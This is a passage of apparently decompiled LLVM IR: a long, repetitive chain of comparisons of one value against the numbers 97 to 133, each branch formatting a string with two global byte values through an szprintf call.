  %v7_bf64 = icmp eq i32 %v2_a93c, 97
  br i1 %v7_bf64, label %dec_label_pc_bf6c, label %dec_label_pc_bf94

dec_label_pc_bf6c:                                ; preds = %dec_label_pc_bf60
  %v2_bf6c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bf78 = load i8, i8* @global_var_2c601.66, align 1
  %v3_bf84 = load i8, i8* @global_var_2c602.67, align 1
  %v4_bf90 = sext i8 %v3_bf78 to i32
  %v6_bf90 = sext i8 %v3_bf84 to i32
  %v8_bf90 = call i32 @szprintf(i32 %v2_bf6c, i32 ptrtoint ([13 x i8]* @global_var_20344.258 to i32), i32 %v4_bf90, i32 %v6_bf90, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf94

dec_label_pc_bf94:                                ; preds = %dec_label_pc_bf60, %dec_label_pc_bf6c
  %v7_bf98 = icmp eq i32 %v2_a93c, 98
  br i1 %v7_bf98, label %dec_label_pc_bfa0, label %dec_label_pc_bfc8

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_bf94
  %v2_bfa0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bfac = load i8, i8* @global_var_2c601.66, align 1
  %v3_bfb8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_bfc4 = sext i8 %v3_bfac to i32
  %v6_bfc4 = sext i8 %v3_bfb8 to i32
  %v8_bfc4 = call i32 @szprintf(i32 %v2_bfa0, i32 ptrtoint ([13 x i8]* @global_var_20354.260 to i32), i32 %v4_bfc4, i32 %v6_bfc4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bfc8

dec_label_pc_bfc8:                                ; preds = %dec_label_pc_bf94, %dec_label_pc_bfa0
  %v7_bfcc = icmp eq i32 %v2_a93c, 99
  br i1 %v7_bfcc, label %dec_label_pc_bfd4, label %dec_label_pc_bffc

dec_label_pc_bfd4:                                ; preds = %dec_label_pc_bfc8
  %v2_bfd4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bfe0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_bfec = load i8, i8* @global_var_2c602.67, align 1
  %v4_bff8 = sext i8 %v3_bfe0 to i32
  %v6_bff8 = sext i8 %v3_bfec to i32
  %v8_bff8 = call i32 @szprintf(i32 %v2_bfd4, i32 ptrtoint ([13 x i8]* @global_var_20364.262 to i32), i32 %v4_bff8, i32 %v6_bff8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bffc

dec_label_pc_bffc:                                ; preds = %dec_label_pc_bfc8, %dec_label_pc_bfd4
  %v7_c000 = icmp eq i32 %v2_a93c, 100
  br i1 %v7_c000, label %dec_label_pc_c008, label %dec_label_pc_c030

dec_label_pc_c008:                                ; preds = %dec_label_pc_bffc
  %v2_c008 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c014 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c020 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c02c = sext i8 %v3_c014 to i32
  %v6_c02c = sext i8 %v3_c020 to i32
  %v8_c02c = call i32 @szprintf(i32 %v2_c008, i32 ptrtoint ([13 x i8]* @global_var_20374.264 to i32), i32 %v4_c02c, i32 %v6_c02c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c030

dec_label_pc_c030:                                ; preds = %dec_label_pc_bffc, %dec_label_pc_c008
  %v7_c034 = icmp eq i32 %v2_a93c, 101
  br i1 %v7_c034, label %dec_label_pc_c03c, label %dec_label_pc_c064

dec_label_pc_c03c:                                ; preds = %dec_label_pc_c030
  %v2_c03c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c048 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c054 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c060 = sext i8 %v3_c048 to i32
  %v6_c060 = sext i8 %v3_c054 to i32
  %v8_c060 = call i32 @szprintf(i32 %v2_c03c, i32 ptrtoint ([13 x i8]* @global_var_20384.266 to i32), i32 %v4_c060, i32 %v6_c060, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c064

dec_label_pc_c064:                                ; preds = %dec_label_pc_c030, %dec_label_pc_c03c
  %v7_c068 = icmp eq i32 %v2_a93c, 102
  br i1 %v7_c068, label %dec_label_pc_c070, label %dec_label_pc_c098

dec_label_pc_c070:                                ; preds = %dec_label_pc_c064
  %v2_c070 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c07c = load i8, i8* @global_var_2c601.66, align 1
  %v3_c088 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c094 = sext i8 %v3_c07c to i32
  %v6_c094 = sext i8 %v3_c088 to i32
  %v8_c094 = call i32 @szprintf(i32 %v2_c070, i32 ptrtoint ([12 x i8]* @global_var_20394.268 to i32), i32 %v4_c094, i32 %v6_c094, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c098

dec_label_pc_c098:                                ; preds = %dec_label_pc_c064, %dec_label_pc_c070
  %v7_c09c = icmp eq i32 %v2_a93c, 103
  br i1 %v7_c09c, label %dec_label_pc_c0a4, label %dec_label_pc_c0cc

dec_label_pc_c0a4:                                ; preds = %dec_label_pc_c098
  %v2_c0a4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c0b0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c0bc = load i8, i8* @global_var_2c602.67, align 1
  %v4_c0c8 = sext i8 %v3_c0b0 to i32
  %v6_c0c8 = sext i8 %v3_c0bc to i32
  %v8_c0c8 = call i32 @szprintf(i32 %v2_c0a4, i32 ptrtoint ([13 x i8]* @global_var_203a0.270 to i32), i32 %v4_c0c8, i32 %v6_c0c8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c0cc

dec_label_pc_c0cc:                                ; preds = %dec_label_pc_c098, %dec_label_pc_c0a4
  %v7_c0d0 = icmp eq i32 %v2_a93c, 104
  br i1 %v7_c0d0, label %dec_label_pc_c0d8, label %dec_label_pc_c100

dec_label_pc_c0d8:                                ; preds = %dec_label_pc_c0cc
  %v2_c0d8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c0e4 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c0f0 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c0fc = sext i8 %v3_c0e4 to i32
  %v6_c0fc = sext i8 %v3_c0f0 to i32
  %v8_c0fc = call i32 @szprintf(i32 %v2_c0d8, i32 ptrtoint ([13 x i8]* @global_var_203b0.272 to i32), i32 %v4_c0fc, i32 %v6_c0fc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c100

dec_label_pc_c100:                                ; preds = %dec_label_pc_c0cc, %dec_label_pc_c0d8
  %v7_c104 = icmp eq i32 %v2_a93c, 105
  br i1 %v7_c104, label %dec_label_pc_c10c, label %dec_label_pc_c134

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c100
  %v2_c10c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c118 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c124 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c130 = sext i8 %v3_c118 to i32
  %v6_c130 = sext i8 %v3_c124 to i32
  %v8_c130 = call i32 @szprintf(i32 %v2_c10c, i32 ptrtoint ([13 x i8]* @global_var_203c0.274 to i32), i32 %v4_c130, i32 %v6_c130, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c134

dec_label_pc_c134:                                ; preds = %dec_label_pc_c100, %dec_label_pc_c10c
  %v7_c138 = icmp eq i32 %v2_a93c, 106
  br i1 %v7_c138, label %dec_label_pc_c140, label %dec_label_pc_c168

dec_label_pc_c140:                                ; preds = %dec_label_pc_c134
  %v2_c140 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c14c = load i8, i8* @global_var_2c601.66, align 1
  %v3_c158 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c164 = sext i8 %v3_c14c to i32
  %v6_c164 = sext i8 %v3_c158 to i32
  %v8_c164 = call i32 @szprintf(i32 %v2_c140, i32 ptrtoint ([12 x i8]* @global_var_203d0.276 to i32), i32 %v4_c164, i32 %v6_c164, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c168

dec_label_pc_c168:                                ; preds = %dec_label_pc_c134, %dec_label_pc_c140
  %v7_c16c = icmp eq i32 %v2_a93c, 107
  br i1 %v7_c16c, label %dec_label_pc_c174, label %dec_label_pc_c19c

dec_label_pc_c174:                                ; preds = %dec_label_pc_c168
  %v2_c174 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c180 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c18c = load i8, i8* @global_var_2c602.67, align 1
  %v4_c198 = sext i8 %v3_c180 to i32
  %v6_c198 = sext i8 %v3_c18c to i32
  %v8_c198 = call i32 @szprintf(i32 %v2_c174, i32 ptrtoint ([13 x i8]* @global_var_203dc.278 to i32), i32 %v4_c198, i32 %v6_c198, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c19c

dec_label_pc_c19c:                                ; preds = %dec_label_pc_c168, %dec_label_pc_c174
  %v7_c1a0 = icmp eq i32 %v2_a93c, 108
  br i1 %v7_c1a0, label %dec_label_pc_c1a8, label %dec_label_pc_c1d0

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c19c
  %v2_c1a8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c1b4 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c1c0 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c1cc = sext i8 %v3_c1b4 to i32
  %v6_c1cc = sext i8 %v3_c1c0 to i32
  %v8_c1cc = call i32 @szprintf(i32 %v2_c1a8, i32 ptrtoint ([14 x i8]* @global_var_203ec.280 to i32), i32 %v4_c1cc, i32 %v6_c1cc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c1d0

dec_label_pc_c1d0:                                ; preds = %dec_label_pc_c19c, %dec_label_pc_c1a8
  %v7_c1d4 = icmp eq i32 %v2_a93c, 109
  br i1 %v7_c1d4, label %dec_label_pc_c1dc, label %dec_label_pc_c204

dec_label_pc_c1dc:                                ; preds = %dec_label_pc_c1d0
  %v2_c1dc = ptrtoint i32* %stack_var_-36 to i32
  %v3_c1e8 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c1f4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c200 = sext i8 %v3_c1e8 to i32
  %v6_c200 = sext i8 %v3_c1f4 to i32
  %v8_c200 = call i32 @szprintf(i32 %v2_c1dc, i32 ptrtoint ([14 x i8]* @global_var_203fc.282 to i32), i32 %v4_c200, i32 %v6_c200, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c204

dec_label_pc_c204:                                ; preds = %dec_label_pc_c1d0, %dec_label_pc_c1dc
  %v7_c208 = icmp eq i32 %v2_a93c, 110
  br i1 %v7_c208, label %dec_label_pc_c210, label %dec_label_pc_c238

dec_label_pc_c210:                                ; preds = %dec_label_pc_c204
  %v2_c210 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c21c = load i8, i8* @global_var_2c601.66, align 1
  %v3_c228 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c234 = sext i8 %v3_c21c to i32
  %v6_c234 = sext i8 %v3_c228 to i32
  %v8_c234 = call i32 @szprintf(i32 %v2_c210, i32 ptrtoint ([13 x i8]* @global_var_2040c.284 to i32), i32 %v4_c234, i32 %v6_c234, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c238

dec_label_pc_c238:                                ; preds = %dec_label_pc_c204, %dec_label_pc_c210
  %v7_c23c = icmp eq i32 %v2_a93c, 111
  br i1 %v7_c23c, label %dec_label_pc_c244, label %dec_label_pc_c26c

dec_label_pc_c244:                                ; preds = %dec_label_pc_c238
  %v2_c244 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c250 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c25c = load i8, i8* @global_var_2c602.67, align 1
  %v4_c268 = sext i8 %v3_c250 to i32
  %v6_c268 = sext i8 %v3_c25c to i32
  %v8_c268 = call i32 @szprintf(i32 %v2_c244, i32 ptrtoint ([14 x i8]* @global_var_2041c.286 to i32), i32 %v4_c268, i32 %v6_c268, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c26c

dec_label_pc_c26c:                                ; preds = %dec_label_pc_c238, %dec_label_pc_c244
  %v7_c270 = icmp eq i32 %v2_a93c, 112
  br i1 %v7_c270, label %dec_label_pc_c278, label %dec_label_pc_c2a0

dec_label_pc_c278:                                ; preds = %dec_label_pc_c26c
  %v2_c278 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c284 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c290 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c29c = sext i8 %v3_c284 to i32
  %v6_c29c = sext i8 %v3_c290 to i32
  %v8_c29c = call i32 @szprintf(i32 %v2_c278, i32 ptrtoint ([14 x i8]* @global_var_2042c.288 to i32), i32 %v4_c29c, i32 %v6_c29c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2a0

dec_label_pc_c2a0:                                ; preds = %dec_label_pc_c26c, %dec_label_pc_c278
  %v7_c2a4 = icmp eq i32 %v2_a93c, 113
  br i1 %v7_c2a4, label %dec_label_pc_c2ac, label %dec_label_pc_c2d4

dec_label_pc_c2ac:                                ; preds = %dec_label_pc_c2a0
  %v2_c2ac = ptrtoint i32* %stack_var_-36 to i32
  %v3_c2b8 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c2c4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c2d0 = sext i8 %v3_c2b8 to i32
  %v6_c2d0 = sext i8 %v3_c2c4 to i32
  %v8_c2d0 = call i32 @szprintf(i32 %v2_c2ac, i32 ptrtoint ([13 x i8]* @global_var_2043c.290 to i32), i32 %v4_c2d0, i32 %v6_c2d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2d4

dec_label_pc_c2d4:                                ; preds = %dec_label_pc_c2a0, %dec_label_pc_c2ac
  %v7_c2d8 = icmp eq i32 %v2_a93c, 114
  br i1 %v7_c2d8, label %dec_label_pc_c2e0, label %dec_label_pc_c308

dec_label_pc_c2e0:                                ; preds = %dec_label_pc_c2d4
  %v2_c2e0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c2ec = load i8, i8* @global_var_2c601.66, align 1
  %v3_c2f8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c304 = sext i8 %v3_c2ec to i32
  %v6_c304 = sext i8 %v3_c2f8 to i32
  %v8_c304 = call i32 @szprintf(i32 %v2_c2e0, i32 ptrtoint ([14 x i8]* @global_var_2044c.292 to i32), i32 %v4_c304, i32 %v6_c304, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c308

dec_label_pc_c308:                                ; preds = %dec_label_pc_c2d4, %dec_label_pc_c2e0
  %v7_c30c = icmp eq i32 %v2_a93c, 115
  br i1 %v7_c30c, label %dec_label_pc_c314, label %dec_label_pc_c33c

dec_label_pc_c314:                                ; preds = %dec_label_pc_c308
  %v2_c314 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c320 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c32c = load i8, i8* @global_var_2c602.67, align 1
  %v4_c338 = sext i8 %v3_c320 to i32
  %v6_c338 = sext i8 %v3_c32c to i32
  %v8_c338 = call i32 @szprintf(i32 %v2_c314, i32 ptrtoint ([13 x i8]* @global_var_2045c.294 to i32), i32 %v4_c338, i32 %v6_c338, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c33c

dec_label_pc_c33c:                                ; preds = %dec_label_pc_c308, %dec_label_pc_c314
  %v7_c340 = icmp eq i32 %v2_a93c, 116
  br i1 %v7_c340, label %dec_label_pc_c348, label %dec_label_pc_c370

dec_label_pc_c348:                                ; preds = %dec_label_pc_c33c
  %v2_c348 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c354 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c360 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c36c = sext i8 %v3_c354 to i32
  %v6_c36c = sext i8 %v3_c360 to i32
  %v8_c36c = call i32 @szprintf(i32 %v2_c348, i32 ptrtoint ([13 x i8]* @global_var_2046c.296 to i32), i32 %v4_c36c, i32 %v6_c36c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c370

dec_label_pc_c370:                                ; preds = %dec_label_pc_c33c, %dec_label_pc_c348
  %v7_c374 = icmp eq i32 %v2_a93c, 117
  br i1 %v7_c374, label %dec_label_pc_c37c, label %dec_label_pc_c3a4

dec_label_pc_c37c:                                ; preds = %dec_label_pc_c370
  %v2_c37c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c388 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c394 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c3a0 = sext i8 %v3_c388 to i32
  %v6_c3a0 = sext i8 %v3_c394 to i32
  %v8_c3a0 = call i32 @szprintf(i32 %v2_c37c, i32 ptrtoint ([14 x i8]* @global_var_2047c.298 to i32), i32 %v4_c3a0, i32 %v6_c3a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3a4

dec_label_pc_c3a4:                                ; preds = %dec_label_pc_c370, %dec_label_pc_c37c
  %v7_c3a8 = icmp eq i32 %v2_a93c, 118
  br i1 %v7_c3a8, label %dec_label_pc_c3b0, label %dec_label_pc_c3d8

dec_label_pc_c3b0:                                ; preds = %dec_label_pc_c3a4
  %v2_c3b0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c3bc = load i8, i8* @global_var_2c601.66, align 1
  %v3_c3c8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c3d4 = sext i8 %v3_c3bc to i32
  %v6_c3d4 = sext i8 %v3_c3c8 to i32
  %v8_c3d4 = call i32 @szprintf(i32 %v2_c3b0, i32 ptrtoint ([14 x i8]* @global_var_2048c.300 to i32), i32 %v4_c3d4, i32 %v6_c3d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3d8

dec_label_pc_c3d8:                                ; preds = %dec_label_pc_c3a4, %dec_label_pc_c3b0
  %v7_c3dc = icmp eq i32 %v2_a93c, 119
  br i1 %v7_c3dc, label %dec_label_pc_c3e4, label %dec_label_pc_c40c

dec_label_pc_c3e4:                                ; preds = %dec_label_pc_c3d8
  %v2_c3e4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c3f0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c3fc = load i8, i8* @global_var_2c602.67, align 1
  %v4_c408 = sext i8 %v3_c3f0 to i32
  %v6_c408 = sext i8 %v3_c3fc to i32
  %v8_c408 = call i32 @szprintf(i32 %v2_c3e4, i32 ptrtoint ([14 x i8]* @global_var_2049c.302 to i32), i32 %v4_c408, i32 %v6_c408, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c40c

dec_label_pc_c40c:                                ; preds = %dec_label_pc_c3d8, %dec_label_pc_c3e4
  %v7_c410 = icmp eq i32 %v2_a93c, 120
  br i1 %v7_c410, label %dec_label_pc_c418, label %dec_label_pc_c440

dec_label_pc_c418:                                ; preds = %dec_label_pc_c40c
  %v2_c418 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c424 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c430 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c43c = sext i8 %v3_c424 to i32
  %v6_c43c = sext i8 %v3_c430 to i32
  %v8_c43c = call i32 @szprintf(i32 %v2_c418, i32 ptrtoint ([14 x i8]* @global_var_204ac.304 to i32), i32 %v4_c43c, i32 %v6_c43c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c440

dec_label_pc_c440:                                ; preds = %dec_label_pc_c40c, %dec_label_pc_c418
  %v7_c444 = icmp eq i32 %v2_a93c, 121
  br i1 %v7_c444, label %dec_label_pc_c44c, label %dec_label_pc_c474

dec_label_pc_c44c:                                ; preds = %dec_label_pc_c440
  %v2_c44c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c458 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c464 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c470 = sext i8 %v3_c458 to i32
  %v6_c470 = sext i8 %v3_c464 to i32
  %v8_c470 = call i32 @szprintf(i32 %v2_c44c, i32 ptrtoint ([14 x i8]* @global_var_203ec.280 to i32), i32 %v4_c470, i32 %v6_c470, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c474

dec_label_pc_c474:                                ; preds = %dec_label_pc_c440, %dec_label_pc_c44c
  %v7_c478 = icmp eq i32 %v2_a93c, 122
  br i1 %v7_c478, label %dec_label_pc_c480, label %dec_label_pc_c4a8

dec_label_pc_c480:                                ; preds = %dec_label_pc_c474
  %v2_c480 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c48c = load i8, i8* @global_var_2c601.66, align 1
  %v3_c498 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c4a4 = sext i8 %v3_c48c to i32
  %v6_c4a4 = sext i8 %v3_c498 to i32
  %v8_c4a4 = call i32 @szprintf(i32 %v2_c480, i32 ptrtoint ([13 x i8]* @global_var_204bc.306 to i32), i32 %v4_c4a4, i32 %v6_c4a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c4a8

dec_label_pc_c4a8:                                ; preds = %dec_label_pc_c474, %dec_label_pc_c480
  %v7_c4ac = icmp eq i32 %v2_a93c, 123
  br i1 %v7_c4ac, label %dec_label_pc_c4b4, label %dec_label_pc_c4dc

dec_label_pc_c4b4:                                ; preds = %dec_label_pc_c4a8
  %v2_c4b4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c4c0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c4cc = load i8, i8* @global_var_2c602.67, align 1
  %v4_c4d8 = sext i8 %v3_c4c0 to i32
  %v6_c4d8 = sext i8 %v3_c4cc to i32
  %v8_c4d8 = call i32 @szprintf(i32 %v2_c4b4, i32 ptrtoint ([12 x i8]* @global_var_204cc.308 to i32), i32 %v4_c4d8, i32 %v6_c4d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c4dc

dec_label_pc_c4dc:                                ; preds = %dec_label_pc_c4a8, %dec_label_pc_c4b4
  %v7_c4e0 = icmp eq i32 %v2_a93c, 124
  br i1 %v7_c4e0, label %dec_label_pc_c4e8, label %dec_label_pc_c510

dec_label_pc_c4e8:                                ; preds = %dec_label_pc_c4dc
  %v2_c4e8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c4f4 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c500 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c50c = sext i8 %v3_c4f4 to i32
  %v6_c50c = sext i8 %v3_c500 to i32
  %v8_c50c = call i32 @szprintf(i32 %v2_c4e8, i32 ptrtoint ([14 x i8]* @global_var_204d8.310 to i32), i32 %v4_c50c, i32 %v6_c50c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c510

dec_label_pc_c510:                                ; preds = %dec_label_pc_c4dc, %dec_label_pc_c4e8
  %v7_c514 = icmp eq i32 %v2_a93c, 125
  br i1 %v7_c514, label %dec_label_pc_c51c, label %dec_label_pc_c544

dec_label_pc_c51c:                                ; preds = %dec_label_pc_c510
  %v2_c51c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c528 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c534 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c540 = sext i8 %v3_c528 to i32
  %v6_c540 = sext i8 %v3_c534 to i32
  %v8_c540 = call i32 @szprintf(i32 %v2_c51c, i32 ptrtoint ([14 x i8]* @global_var_204e8.312 to i32), i32 %v4_c540, i32 %v6_c540, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c544

dec_label_pc_c544:                                ; preds = %dec_label_pc_c510, %dec_label_pc_c51c
  %v7_c548 = icmp eq i32 %v2_a93c, 126
  br i1 %v7_c548, label %dec_label_pc_c550, label %dec_label_pc_c578

dec_label_pc_c550:                                ; preds = %dec_label_pc_c544
  %v2_c550 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c55c = load i8, i8* @global_var_2c601.66, align 1
  %v3_c568 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c574 = sext i8 %v3_c55c to i32
  %v6_c574 = sext i8 %v3_c568 to i32
  %v8_c574 = call i32 @szprintf(i32 %v2_c550, i32 ptrtoint ([14 x i8]* @global_var_204d8.310 to i32), i32 %v4_c574, i32 %v6_c574, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c578

dec_label_pc_c578:                                ; preds = %dec_label_pc_c544, %dec_label_pc_c550
  %v7_c57c = icmp eq i32 %v2_a93c, 127
  br i1 %v7_c57c, label %dec_label_pc_c584, label %dec_label_pc_c5ac

dec_label_pc_c584:                                ; preds = %dec_label_pc_c578
  %v2_c584 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c590 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c59c = load i8, i8* @global_var_2c602.67, align 1
  %v4_c5a8 = sext i8 %v3_c590 to i32
  %v6_c5a8 = sext i8 %v3_c59c to i32
  %v8_c5a8 = call i32 @szprintf(i32 %v2_c584, i32 ptrtoint ([14 x i8]* @global_var_204f8.314 to i32), i32 %v4_c5a8, i32 %v6_c5a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c5ac

dec_label_pc_c5ac:                                ; preds = %dec_label_pc_c578, %dec_label_pc_c584
  %v7_c5b0 = icmp eq i32 %v2_a93c, 128
  br i1 %v7_c5b0, label %dec_label_pc_c5b8, label %dec_label_pc_c5e0

dec_label_pc_c5b8:                                ; preds = %dec_label_pc_c5ac
  %v2_c5b8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c5c4 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c5d0 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c5dc = sext i8 %v3_c5c4 to i32
  %v6_c5dc = sext i8 %v3_c5d0 to i32
  %v8_c5dc = call i32 @szprintf(i32 %v2_c5b8, i32 ptrtoint ([14 x i8]* @global_var_20508.316 to i32), i32 %v4_c5dc, i32 %v6_c5dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c5e0

dec_label_pc_c5e0:                                ; preds = %dec_label_pc_c5ac, %dec_label_pc_c5b8
  %v7_c5e4 = icmp eq i32 %v2_a93c, 129
  br i1 %v7_c5e4, label %dec_label_pc_c5ec, label %dec_label_pc_c614

dec_label_pc_c5ec:                                ; preds = %dec_label_pc_c5e0
  %v2_c5ec = ptrtoint i32* %stack_var_-36 to i32
  %v3_c5f8 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c604 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c610 = sext i8 %v3_c5f8 to i32
  %v6_c610 = sext i8 %v3_c604 to i32
  %v8_c610 = call i32 @szprintf(i32 %v2_c5ec, i32 ptrtoint ([14 x i8]* @global_var_20518.318 to i32), i32 %v4_c610, i32 %v6_c610, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c614

dec_label_pc_c614:                                ; preds = %dec_label_pc_c5e0, %dec_label_pc_c5ec
  %v7_c618 = icmp eq i32 %v2_a93c, 130
  br i1 %v7_c618, label %dec_label_pc_c620, label %dec_label_pc_c648

dec_label_pc_c620:                                ; preds = %dec_label_pc_c614
  %v2_c620 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c62c = load i8, i8* @global_var_2c601.66, align 1
  %v3_c638 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c644 = sext i8 %v3_c62c to i32
  %v6_c644 = sext i8 %v3_c638 to i32
  %v8_c644 = call i32 @szprintf(i32 %v2_c620, i32 ptrtoint ([14 x i8]* @global_var_20528.320 to i32), i32 %v4_c644, i32 %v6_c644, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c648

dec_label_pc_c648:                                ; preds = %dec_label_pc_c614, %dec_label_pc_c620
  %v7_c64c = icmp eq i32 %v2_a93c, 131
  br i1 %v7_c64c, label %dec_label_pc_c654, label %dec_label_pc_c67c

dec_label_pc_c654:                                ; preds = %dec_label_pc_c648
  %v2_c654 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c660 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c66c = load i8, i8* @global_var_2c602.67, align 1
  %v4_c678 = sext i8 %v3_c660 to i32
  %v6_c678 = sext i8 %v3_c66c to i32
  %v8_c678 = call i32 @szprintf(i32 %v2_c654, i32 ptrtoint ([14 x i8]* @global_var_20538.322 to i32), i32 %v4_c678, i32 %v6_c678, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c67c

dec_label_pc_c67c:                                ; preds = %dec_label_pc_c648, %dec_label_pc_c654
  %v7_c680 = icmp eq i32 %v2_a93c, 132
  br i1 %v7_c680, label %dec_label_pc_c688, label %dec_label_pc_c6b0

dec_label_pc_c688:                                ; preds = %dec_label_pc_c67c
  %v2_c688 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c694 = load i8, i8* @global_var_2c601.66, align 1
  %v3_c6a0 = load i8, i8* @global_var_2c602.67, align 1
  %v4_c6ac = sext i8 %v3_c694 to i32
  %v6_c6ac = sext i8 %v3_c6a0 to i32
  %v8_c6ac = call i32 @szprintf(i32 %v2_c688, i32 ptrtoint ([14 x i8]* @global_var_20548.324 to i32), i32 %v4_c6ac, i32 %v6_c6ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c6b0

dec_label_pc_c6b0:                                ; preds = %dec_label_pc_c67c, %dec_label_pc_c688
  %v7_c6b4 = icmp eq i32 %v2_a93c, 133
